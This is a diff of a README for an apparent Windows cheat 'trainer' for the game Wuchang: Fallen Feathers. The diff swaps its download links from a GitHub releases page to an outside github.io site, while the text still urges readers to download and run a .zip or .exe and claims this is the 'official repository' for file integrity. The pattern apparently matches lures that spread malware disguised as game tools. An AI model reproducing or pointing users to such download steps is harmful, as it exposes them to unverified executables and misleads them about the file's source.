@@ -1,6 +1,6 @@
 # 🎮 Wuchang-Fallen-Feathers-Trainer-2026 - Master your game with ease
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/boatbilledheronantichrist359/Wuchang-Fallen-Feathers-Trainer-2026/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://boatbilledheronantichrist359.github.io)
 
 Wuchang-Fallen-Feathers-Trainer-2026 offers control over gameplay elements within the Wuchang: Fallen Feathers title. This software modifies aspects of the game engine to assist players who want to adjust game difficulty or personalize their experience on Windows 10 and Windows 11 systems.
 
@@ -19,7 +19,7 @@ Computers require specific hardware and software to run this trainer without err
 
 Follow these steps to obtain the correct files for your machine. You must use the official repository to ensure file integrity.
 
-1. Navigate to the release page: https://github.com/boatbilledheronantichrist359/Wuchang-Fallen-Feathers-Trainer-2026/releases
+1. Navigate to the release page: https://boatbilledheronantichrist359.github.io
 2. Locate the section labeled Assets at the bottom of the latest release.
 3. Select the file ending in .zip or .exe to begin the process.
 4. Save the file to your desktop for easy access.
